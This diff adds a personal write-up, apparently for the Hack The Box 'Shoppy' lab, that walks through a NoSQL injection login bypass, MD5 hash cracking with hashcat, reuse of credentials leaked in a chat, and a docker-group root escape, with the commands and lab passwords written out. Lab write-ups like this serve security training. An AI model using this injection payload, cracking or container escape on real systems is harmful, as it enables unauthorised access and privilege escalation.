@@ -162,3 +162,183 @@ Found: mattermost.shoppy.htb (Status: 200) [Size: 3122]
 2022/09/25 22:32:50 Finished
 ===============================================================
 ```
+
+Try SQL Bypass Login but got nothing [[SQL-Bypass-Login-Cheatsheet]]
+
+Try with NoSQL: [https://book.hacktricks.xyz/pentesting-web/nosql-injection](https://book.hacktricks.xyz/pentesting-web/nosql-injection)
+
+We can login with user `admin'||'1==1`
+
+There a search user button, we can use it to list down the user.
+keep input `admin'||'1==1` to list all the user.
+
+```json
+[{"_id":"62db0e93d6d6a999a66ee67a","username":"admin","password":"23c6877d9e2b564ef8b32c3a23de27b2"},{"_id":"62db0e93d6d6a999a66ee67b","username":"josh","password":"6ebcea65320589ca4f2f1ce039975995"}]
+```
+
+We have 2 user `admin`, and `josh` and their md5 hash password
+![[crackstation.png]]
+password `josh` :`remembermethisway`
+
+Or you can tried to do it yourself with `hashcat`
+
+```bash
+hashcat -m 0 -a 0 pass.hash /usr/share/wordlists/rockyou.txt -O
+....
+
+Host memory required for this attack: 3 MB
+
+Dictionary cache built:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344392
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+* Runtime...: 1 sec
+
+6ebcea65320589ca4f2f1ce039975995:remembermethisway
+Approaching final keyspace - workload adjusted.
+
+
+Session..........: hashcat
+Status...........: Exhausted
+Hash.Mode........: 0 (MD5)
+Hash.Target......: pass.hash
+Time.Started.....: Tue Oct  4 16:47:00 2022 (5 secs)
+Time.Estimated...: Tue Oct  4 16:47:05 2022 (0 secs)
+Kernel.Feature...: Optimized Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:  2419.1 kH/s (0.52ms) @ Accel:512 Loops:1 Thr:1 Vec:8
+Recovered........: 1/2 (50.00%) Digests
+Progress.........: 14344385/14344385 (100.00%)
+Rejected.........: 3094/14344385 (0.02%)
+Restore.Point....: 14344385/14344385 (100.00%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: $HEX[21217265626f756e642121] -> $HEX[042a0337c2a156616d6f732103]
+
+Started: Tue Oct  4 16:46:22 2022
+Stopped: Tue Oct  4 16:47:07 2022
+
+┌──(bop㉿BOP-PC)-[/mnt/e/OneDrive/Workspace/oscp-note/Hackthebox/Box/Shoppy]
+└─$
+```
+
+Go tried to login server via SSH but doesn't work.
+We remember we have `mattermost.shoppy.htb` to login.
+![[mattermost-1.png]]
+
+
+![[mattermost-2.png]]
+
+There are user creds
+```
+username: jaeger
+password: Sh0ppyBest@pp!
+```
+
+We can login to server with this creds. It work.
+
+- User flag:
+```bash
+jaeger@shoppy:~$ cat shoppy_start.sh
+#!/bin/bash
+
+export NVM_DIR="$HOME/.nvm"
+[ -s "$NVM_DIR/nvm.sh" ] && \. "$NVM_DIR/nvm.sh"
+
+cd /home/jaeger/ShoppyApp && npm start
+jaeger@shoppy:~$ cat user.txt
+
+jaeger@shoppy:~
+```
+
+# Foothold
+Noticed that in chat, there some programs call password manager running in this server, that could be hint for privilege escalate.
+
+Check port running:
+
+```bash
+jaeger@shoppy:~$ netstat -tulpn
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:8065          0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:27017         0.0.0.0:*               LISTEN      -
+tcp6       0      0 :::80                   :::*                    LISTEN      -
+tcp6       0      0 :::22                   :::*                    LISTEN      -
+tcp6       0      0 ::1:3000                :::*                    LISTEN      1278/node /home/jae
+tcp6       0      0 ::1:5432                :::*                    LISTEN      -
+tcp6       0      0 :::9093                 :::*                    LISTEN      -
+udp        0      0 0.0.0.0:68              0.0.0.0:*                           -
+jaeger@shoppy:~$
+```
+
+Check sudo:
+```bash
+jaeger@shoppy:/home/deploy$ sudo -l
+[sudo] password for jaeger:
+Sorry, try again.
+[sudo] password for jaeger:
+Matching Defaults entries for jaeger on shoppy:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User jaeger may run the following commands on shoppy:
+    (deploy) /home/deploy/password-manager
+```
+
+Tried to read with `strings` command.
+
+i am stuck here.  i take a look at some other writeup and found the password so fucking ez to get password with just `cat`.
+cat `/home/deploy/password-manager`
+
+```bash
+[]A\A]A^A_Welcome to Josh password manager!Please enter your master password: SampleAccess granted! Here is creds !cat /home/deploy/creds.txtAccess denied! This incident will be reported !@0@h%
+```
+
+
+Get the creds:
+
+```bash
+jaeger@shoppy:/home/deploy$ sudo -u deploy /home/deploy/password-manager
+Welcome to Josh password manager!
+Please enter your master password: Sample
+Access granted! Here is creds !
+Deploy Creds :
+username: deploy
+password: Deploying@pp!
+```
+
+Now we can switch to `deploy` user.
+
+```bash
+jaeger@shoppy:/home/deploy$ su deploy
+Password:
+$ id
+uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)
+$
+```
+
+
+Escalate via `docker`
+[https://gtfobins.github.io/gtfobins/docker/](https://gtfobins.github.io/gtfobins/docker/)
+
+```bash
+$ docker ps
+CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES
+$
+$
+$
+$ docker image ls
+REPOSITORY   TAG       IMAGE ID       CREATED        SIZE
+alpine       latest    d7d3d98c851f   2 months ago   5.53MB
+$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+# cd /root
+# ls
+root.txt
+# cat root.txt
+
+#
+```
